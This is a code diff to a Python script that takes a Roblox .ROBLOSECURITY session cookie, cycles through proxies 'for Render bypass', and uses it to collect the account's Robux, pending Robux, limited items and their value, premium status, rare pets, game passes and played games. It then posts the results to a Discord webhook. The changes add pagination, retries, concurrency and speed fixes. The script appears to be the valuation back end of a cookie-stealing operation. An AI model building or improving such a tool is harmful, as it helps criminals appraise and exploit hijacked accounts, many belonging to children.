@@ -5,6 +5,7 @@ import time
 import random
 import requests
 from datetime import datetime, timezone
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # Your proxy list for Render bypass
 RAW_PROXY_LIST = """
@@ -36,10 +37,11 @@ SPECIAL_ASSETS = {
     "Violet Valk": 1402432199,
 }
 
+# Note: The universe ID is NOT the number in the game's URL (that's the place ID).
 GAMES = {
     "Adopt Me": 383310974,
-    "MM2": 66654135,
-    "PS99": 3317771874,
+    "MM2": 142823291,
+    "PS99": 3259657279,
 }
 
 def extract_and_clean_cookie(raw_input):
@@ -58,6 +60,7 @@ def extract_and_clean_cookie(raw_input):
     return cookie.lstrip('.').rstrip(';').strip()
 
 def get_working_session(roblosecurity):
+    # SPEED FIX 1: Single requests.Session() for every request so connections are reused
     session = requests.Session()
     if roblosecurity:
         session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
@@ -82,46 +85,225 @@ def get_working_session(roblosecurity):
         proxy_dict = {"http": p, "https": p}
         try:
             session.proxies = proxy_dict
-            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=3)
+            # Endpoint: GET https://users.roblox.com/v1/users/authenticated
+            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
             if test_res.status_code != 429:
                 return session, test_res
         except Exception:
             continue
 
     session.proxies = {}
-    fallback_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
+    # Endpoint: GET https://users.roblox.com/v1/users/authenticated
+    fallback_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
     return session, fallback_res
 
 def api_get(session, url, **kwargs):
-    try:
-        r = session.get(url, timeout=4, **kwargs)
-        if r.status_code == 200:
-            return r.json()
-    except Exception:
-        pass
-    return None
+    """
+    SPEED FIX 5: Remove fixed 0.3s sleep. Only sleep when a 429 happens: 
+    retry up to 3 times with increasing backoff (1.5s, 3s, 4.5s).
+    RELIABILITY: Distinguish a failed request from a real zero. Returns status and parsed data or error.
+    """
+    backoffs = [1.5, 3.0, 4.5]
+    for attempt in range(4): # Initial attempt + 3 retries
+        try:
+            # SPEED FIX 1: timeout=10 on each call
+            r = session.get(url, timeout=10, **kwargs)
+            if r.status_code == 429:
+                if attempt < 3:
+                    time.sleep(backoffs[attempt])
+                    continue
+                return {"status": 429, "error": "rate_limited"}
+            if r.status_code == 403:
+                return {"status": 403, "error": "forbidden"}
+            if r.status_code == 200:
+                try:
+                    # RELIABILITY: Wrap JSON parsing in try/except
+                    return {"status": 200, "data": r.json()}
+                except ValueError:
+                    return {"status": 200, "error": "bad_json"}
+            return {"status": r.status_code, "error": "http_error"}
+        except Exception as e:
+            if attempt < 3:
+                time.sleep(1.0)
+                continue
+            return {"status": 500, "error": str(e)}
+    return {"status": 500, "error": "max_retries_exceeded"}
+
+def startup_universe_check(session, games_dict):
+    """
+    RELIABILITY: Startup check that calls games.roblox.com/v1/games?universeIds=... 
+    for universe IDs and prints each ID with its game name, warning if an ID returns nothing.
+    """
+    u_ids = list(games_dict.values())
+    ids_str = ",".join(map(str, u_ids))
+    # Endpoint: GET https://games.roblox.com/v1/games
+    res = api_get(session, f"https://games.roblox.com/v1/games?universeIds={ids_str}")
+    if res and res.get("status") == 200:
+        data = res["data"].get("data", [])
+        found_ids = {g["id"] for g in data}
+        for name, uid in games_dict.items():
+            if uid in found_ids:
+                for g in data:
+                    if g["id"] == uid:
+                        print(f"Startup Check Verified: Universe ID {uid} -> {g['name']}", file=sys.stderr)
+            else:
+                print(f"WARNING: Universe ID {uid} ({name}) returned nothing from Roblox API!", file=sys.stderr)
+    else:
+        print("WARNING: Startup universe check request failed.", file=sys.stderr)
+
+def get_all_owned_gamepasses(session, user_id):
+    """
+    SPEED FIX 2: Fetch ALL owned gamepasses ONCE (inventory.roblox.com/v2/users/{id}/inventory/34, 
+    paginated, limit 100, follow nextPageCursor) and store asset IDs in a set.
+    RELIABILITY: If request returns 403, return "inventory private". If failed, return None.
+    """
+    owned_set = set()
+    cursor = ""
+    while True:
+        params = {"limit": 100}
+        if cursor:
+            params["cursor"] = cursor
+        # Endpoint: GET https://inventory.roblox.com/v2/users/{id}/inventory/34
+        res = api_get(session, f"https://inventory.roblox.com/v2/users/{user_id}/inventory/34", params=params)
+        if res and res.get("status") == 403:
+            return "inventory private"
+        if not res or res.get("status") != 200:
+            return None
+        
+        data = res["data"]
+        for item in data.get("data", []):
+            asset_id = item.get("assetId") or item.get("id") or item.get("itemDetails", {}).get("id")
+            if asset_id:
+                try:
+                    owned_set.add(int(asset_id))
+                except ValueError:
+                    pass
+        
+        cursor = data.get("nextPageCursor")
+        if not cursor:
+            break
+    return owned_set
+
+def process_single_game(session, user_id, game_name, universe_id, owned_gamepasses_set):
+    """
+    SPEED FIX 2 & 3 & 4: Worker function to process a single game concurrently.
+    - Count overlap with set intersection locally.
+    - Check badges against awarded-dates in chunks of 100, stopping at the FIRST chunk returning an awarded badge.
+    - If owned gamepasses > 0, skip badge check entirely and mark played.
+    RELIABILITY: Distinguish errors from zero/false by returning "error" string when requests fail.
+    """
+    played = False
+    owned_passes_count = "error"
+
+    # 1. Fetch game's gamepasses (paginated)
+    game_passes = []
+    cursor = ""
+    passes_failed = False
+    while True:
+        params = {"limit": 100}
+        if cursor:
+            params["cursor"] = cursor
+        # Endpoint: GET https://games.roblox.com/v1/games/{universeId}/game-passes
+        res = api_get(session, f"https://games.roblox.com/v1/games/{universe_id}/game-passes", params=params)
+        if not res or res.get("status") != 200:
+            passes_failed = True
+            break
+        data = res["data"]
+        for p in data.get("data", []):
+            pid = p.get("id")
+            if pid:
+                game_passes.append(int(pid))
+        cursor = data.get("nextPageCursor")
+        if not cursor:
+            break
+
+    if not passes_failed and isinstance(owned_gamepasses_set, set):
+        # SPEED FIX 2: Count overlap with set intersection locally
+        overlap = set(game_passes).intersection(owned_gamepasses_set)
+        owned_passes_count = len(overlap)
+        if owned_passes_count > 0:
+            played = True
+    elif owned_gamepasses_set == "inventory private":
+        owned_passes_count = "inventory private"
+    else:
+        owned_passes_count = "error"
+
+    # 2. For "played", check badges if not already marked played by gamepasses
+    if not played and owned_passes_count != "error":
+        badge_ids = []
+        cursor = ""
+        badges_failed = False
+        while True:
+            params = {"limit": 100}
+            if cursor:
+                params["cursor"] = cursor
+            # Endpoint: GET https://badges.roblox.com/v1/universes/{universeId}/badges
+            res = api_get(session, f"https://badges.roblox.com/v1/universes/{universe_id}/badges", params=params)
+            if not res or res.get("status") != 200:
+                badges_failed = True
+                break
+            data = res["data"]
+            for b in data.get("data", []):
+                bid = b.get("id")
+                if bid:
+                    badge_ids.append(bid)
+            cursor = data.get("nextPageCursor")
+            if not cursor:
+                break
+
+        if badges_failed:
+            played = "error"
+        elif badge_ids:
+            # SPEED FIX 3: Check against /v1/users/{id}/badges/awarded-dates in chunks of 100 IDs. Stop at the FIRST chunk.
+            for i in range(0, len(badge_ids), 100):
+                chunk = badge_ids[i:i + 100]
+                # Endpoint: GET https://badges.roblox.com/v1/users/{userId}/badges/awarded-dates
+                res = api_get(session, f"https://badges.roblox.com/v1/users/{user_id}/badges/awarded-dates", params={"badgeIds": ",".join(map(str, chunk))})
+                if res and res.get("status") == 200:
+                    if res["data"].get("data"):
+                        played = True
+                        break
+                else:
+                    played = "error"
+                    break
+
+    return game_name, played, owned_passes_count
 
 def main():
+    start_time = time.time()
     try:
         webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
-        if not webhook_url or len(sys.argv) < 2:
+        if not webhook_url:
+            print("DEBUG ERROR: DISCORD_WEBHOOK_URL environment variable is missing!", file=sys.stderr)
+            sys.exit(1)
+
+        if len(sys.argv) < 2:
+            print("DEBUG: No cookie provided in sys.argv[1]", file=sys.stderr)
             sys.exit(1)
         
-        roblosecurity = extract_and_clean_cookie(sys.argv[1])
+        raw_arg = sys.argv[1]
+        roblosecurity = extract_and_clean_cookie(raw_arg)
+
         session, auth_res = get_working_session(roblosecurity)
+        print(f"DEBUG: Auth endpoint status code: {auth_res.status_code}", file=sys.stderr)
         
+        if auth_res.status_code in (401, 403):
+            print("Error: Invalid, expired, or unauthorized cookie (401/403).", file=sys.stderr)
+
         user_id = None
         username = "Unknown User"
         display_name = "Unknown"
-        age_days = 0
-        robux = 0
-        pending = 0
-        rap = 0
-        lim_count = 0
-        premium = False
+        age_days = "error"
+        robux = "error"
+        pending = "error"
+        rap = "error"
+        lim_count = "error"
+        premium = "error"
+        gamepasses_bought = "error"
+        email_ver = False
+        twofa = False
         games_data = {}
         special_owned = {}
-        gamepasses_bought = 0
 
         if auth_res.status_code == 200:
             auth_data = auth_res.json()
@@ -130,68 +312,127 @@ def main():
                 username = auth_data.get("name", "Unknown")
                 display_name = auth_data.get("displayName", username)
 
-                # 1. Quick account info & Currency
-                user_info = api_get(session, f"https://users.roblox.com/v1/users/{user_id}")
-                if user_info:
-                    created = user_info.get("created", "")
+                # Run startup check for universe IDs validation
+                startup_universe_check(session, GAMES)
+
+                # Account info & Creation date
+                # Endpoint: GET https://users.roblox.com/v1/users/{userId}
+                u_res = api_get(session, f"https://users.roblox.com/v1/users/{user_id}")
+                if u_res and u_res.get("status") == 200:
+                    created = u_res["data"].get("created", "")
                     if created:
                         try:
                             age_days = (datetime.now(timezone.utc) - datetime.fromisoformat(created.replace("Z", "+00:00"))).days
                         except Exception:
                             pass
 
+                # Robux balance
+                # Endpoint: GET https://economy.roblox.com/v1/user/currency
                 curr_res = api_get(session, "https://economy.roblox.com/v1/user/currency")
-                if curr_res:
-                    robux = curr_res.get("robux", 0)
+                if curr_res and curr_res.get("status") == 200:
+                    robux = curr_res["data"].get("robux", 0)
 
+                # Pending robux
+                # Endpoint: GET https://economy.roblox.com/v2/users/{userId}/transaction-totals
                 trans_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals", params={"timeFrame": "Month", "transactionType": "summary"})
-                if trans_res:
-                    pending = trans_res.get("pendingRobuxTotal", 0)
+                if trans_res and trans_res.get("status") == 200:
+                    pending = trans_res["data"].get("pendingRobuxTotal", 0)
 
+                # Premium status
+                # Endpoint: GET https://premiumfeatures.roblox.com/v1/users/{userId}/validate-membership
                 prem_res = api_get(session, f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
-                if isinstance(prem_res, bool):
-                    premium = prem_res
-                elif isinstance(prem_res, dict):
-                    premium = prem_res.get("isMember", False)
+                if prem_res and prem_res.get("status") == 200:
+                    val = prem_res["data"]
+                    if isinstance(val, bool):
+                        premium = val
+                    elif isinstance(val, dict):
+                        premium = val.get("isMember", False)
 
-                # 2. Collectibles (Capped to first 100 items for instant load)
-                collectibles_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles", params={"limit": 100, "sortOrder": "Asc"})
-                if collectibles_res and "data" in collectibles_res:
-                    collectibles = collectibles_res["data"]
+                # Collectibles & RAP (paginated)
+                collectibles = []
+                cursor = ""
+                col_failed = False
+                while True:
+                    params = {"limit": 100, "sortOrder": "Asc"}
+                    if cursor:
+                        params["cursor"] = cursor
+                    # Endpoint: GET https://inventory.roblox.com/v1/users/{userId}/assets/collectibles
+                    res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles", params=params)
+                    if res and res.get("status") == 403:
+                        collectibles = "inventory private"
+                        break
+                    if not res or res.get("status") != 200:
+                        col_failed = True
+                        break
+                    data = res["data"]
+                    collectibles += data.get("data", [])
+                    cursor = data.get("nextPageCursor")
+                    if not cursor:
+                        break
+                
+                if collectibles == "inventory private":
+                    lim_count = "inventory private"
+                    rap = "inventory private"
+                elif col_failed:
+                    lim_count = "error"
+                    rap = "error"
+                else:
                     lim_count = len(collectibles)
                     rap = sum(c.get("recentAveragePrice", 0) or 0 for c in collectibles)
-                else:
-                    lim_count = "Private"
-                    rap = "Private"
 
-                # 3. Total gamepasses bought (quick single-page check)
+                # Gamepasses bought total count
                 try:
-                    t_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transactions", params={"transactionType": "Purchase", "limit": 50})
-                    if t_res and "data" in t_res:
-                        for item in t_res["data"]:
+                    gp_count = 0
+                    t_cursor = ""
+                    t_failed = False
+                    while True:
+                        t_params = {"transactionType": "Purchase", "limit": 100}
+                        if t_cursor:
+                            t_params["cursor"] = t_cursor
+                        # Endpoint: GET https://economy.roblox.com/v2/users/{userId}/transactions
+                        t_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transactions", params=t_params)
+                        if not t_res or t_res.get("status") != 200:
+                            t_failed = True
+                            break
+                        t_body = t_res["data"]
+                        for item in t_body.get("data", []):
                             details = item.get("details")
                             if details and details.get("type") == "GamePass":
-                                gamepasses_bought += 1
+                                gp_count += 1
+                        t_cursor = t_body.get("nextPageCursor")
+                        if not t_cursor:
+                            break
+                    gamepasses_bought = "error" if t_failed else gp_count
                 except Exception:
-                    pass
+                    gamepasses_bought = "error"
 
-                # 4. Special items check
+                # Special items ownership check
                 for item_name, asset_id in SPECIAL_ASSETS.items():
+                    # Endpoint: GET https://inventory.roblox.com/v1/users/{userId}/items/Asset/{assetId}
                     asset_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}")
-                    special_owned[item_name] = bool(asset_res and asset_res.get("data"))
+                    if asset_res and asset_res.get("status") == 200:
+                        special_owned[item_name] = bool(asset_res["data"].get("data"))
+                    else:
+                        special_owned[item_name] = "error"
 
-                # 5. Fast game played check using recent badges
-                for game_name, universe_id in GAMES.items():
-                    played = False
-                    b_res = api_get(session, f"https://badges.roblox.com/v1/users/{user_id}/badges", params={"limit": 100})
-                    if b_res and "data" in b_res:
-                        for badge in b_res["data"]:
-                            if badge.get("awardingUniverse", {}).get("id") == universe_id:
-                                played = True
-                                break
-                    games_data[game_name] = {"played": played, "passes": 0}
+                # Fetch all owned gamepasses ONCE for set intersection optimization
+                owned_gamepasses = get_all_owned_gamepasses(session, user_id)
 
-        # Safe formatting
+                # SPEED FIX 4: Run the games in parallel with ThreadPoolExecutor(max_workers=3), one thread per game
+                with ThreadPoolExecutor(max_workers=3) as executor:
+                    futures = {
+                        executor.submit(process_single_game, session, user_id, g_name, u_id, owned_gamepasses): g_name
+                        for g_name, u_id in GAMES.items()
+                    }
+                    for future in as_completed(futures):
+                        try:
+                            g_name, played, passes_count = future.result()
+                            games_data[g_name] = {"played": played, "passes": passes_count}
+                        except Exception:
+                            g_name = futures[future]
+                            games_data[g_name] = {"played": "error", "passes": "error"}
+
+        # Safe formatting for display strings
         robux_display = f"{robux:,}" if isinstance(robux, int) else str(robux)
         pending_display = f"{pending:,}" if isinstance(pending, int) else str(pending)
         rap_display = f"{rap:,}" if isinstance(rap, int) else str(rap)
@@ -235,7 +476,11 @@ def main():
             }
         }
 
-        requests.post(webhook_url, json=payload, timeout=5)
+        requests.post(webhook_url, json=payload, timeout=10)
+
+        # OUTPUT: Timing output at the end ("finished in X.Xs")
+        elapsed_time = time.time() - start_time
+        print(f"finished in {elapsed_time:.1f}s", file=sys.stderr)
 
     except Exception as e:
         print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
